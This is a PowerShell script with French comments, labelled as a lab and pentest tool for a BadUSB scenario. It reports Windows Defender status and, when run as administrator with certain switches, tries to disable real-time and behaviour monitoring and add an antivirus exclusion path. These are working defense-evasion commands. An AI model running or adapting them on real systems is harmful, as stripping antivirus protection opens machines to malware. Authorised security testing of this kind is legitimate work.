# Lab / ROE : tente d'affaiblir Defender (souvent echoue sans admin eleve + sans Tamper Protection).
# Ne pas publier sur repo payload public. VM mandatee uniquement.
param(
    [switch]$AttemptDisable,
    [string]$ExclusionPath = '',
    [switch]$NoNotepad
)

$ErrorActionPreference = 'Continue'
$out = Join-Path $env:TEMP 'defender-leonardo-lab.txt'
$lines = [System.Collections.Generic.List[string]]::new()

function Add-L($s) { $lines.Add($s) }

$isAdmin = $false
try {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p = [Security.Principal.WindowsPrincipal]$id
    $isAdmin = $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
} catch { }

Add-L ('Defender lab report ' + (Get-Date -Format 'o'))
Add-L ('Host: ' + $env:COMPUTERNAME)
Add-L ('User: ' + $env:USERDOMAIN + '\' + $env:USERNAME)
Add-L ('Admin (token): ' + $isAdmin)
Add-L ('AttemptDisable: ' + $AttemptDisable)
Add-L ('ExclusionPath: ' + ($(if ($ExclusionPath) { $ExclusionPath } else { '(aucun)' })))
Add-L ''

$mp = $null
try {
    $mp = Get-MpComputerStatus -ErrorAction Stop
    Add-L '--- Get-MpComputerStatus ---'
    Add-L ('AMService: ' + $mp.AMServiceEnabled)
    Add-L ('RealTimeProtection: ' + $mp.RealTimeProtectionEnabled)
    Add-L ('TamperProtection: ' + $mp.IsTamperProtected)
    Add-L ('AntivirusEnabled: ' + $mp.AntivirusEnabled)
    Add-L ('EngineVersion: ' + $mp.AMEngineVersion)
} catch {
    Add-L ('Get-MpComputerStatus: ' + $_.Exception.Message)
}

Add-L ''
Add-L '--- Contexte pentest / BadUSB ---'
Add-L 'Sans fenetre PowerShell elevee, le clavier HID lance ce script en utilisateur standard.'
Add-L 'Set-MpPreference / Add-MpPreference demandent en general admin + souvent clic UAC.'
Add-L 'Tamper Protection bloque les changements meme pour certains admins.'
Add-L ''

if (-not $isAdmin) {
    Add-L '=> Arret: pas administrateur. Aucune modification Defender tentee.'
    Add-L '   Lab VM: ouvrir PowerShell en admin PUIS relancer avec -AttemptDisable.'
} elseif (-not $AttemptDisable -and -not $ExclusionPath) {
    Add-L '=> Mode rapport seul (defaut). Pour tenter: -AttemptDisable et/ou -ExclusionPath <chemin>.'
} else {
    if ($mp -and $mp.IsTamperProtected) {
        Add-L 'ATTENTION: Tamper Protection est active — echec probable.'
    }
    if ($ExclusionPath) {
        try {
            Add-MpPreference -ExclusionPath $ExclusionPath -ErrorAction Stop
            Add-L ('Add-MpPreference -ExclusionPath OK: ' + $ExclusionPath)
        } catch {
            Add-L ('Add-MpPreference -ExclusionPath ECHEC: ' + $_.Exception.Message)
        }
    }
    if ($AttemptDisable) {
        $tried = @(
            @{ Cmd = 'Set-MpPreference -DisableRealtimeMonitoring $true'; Fn = { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop } },
            @{ Cmd = 'Set-MpPreference -DisableBehaviorMonitoring $true'; Fn = { Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction Stop } }
        )
        foreach ($t in $tried) {
            try {
                & $t.Fn
                Add-L ($t.Cmd + ' : OK')
            } catch {
                Add-L ($t.Cmd + ' : ECHEC — ' + $_.Exception.Message)
            }
        }
        try {
            $mp2 = Get-MpComputerStatus -ErrorAction SilentlyContinue
            if ($mp2) {
                Add-L ''
                Add-L '--- Apres tentative ---'
                Add-L ('RealTimeProtection: ' + $mp2.RealTimeProtectionEnabled)
            }
        } catch { }
    }
}
$lines | Set-Content -LiteralPath $out -Encoding utf8
Write-Host "Rapport: $out"
if (-not $NoNotepad) { Start-Process notepad.exe -ArgumentList $out }
Write-Output $out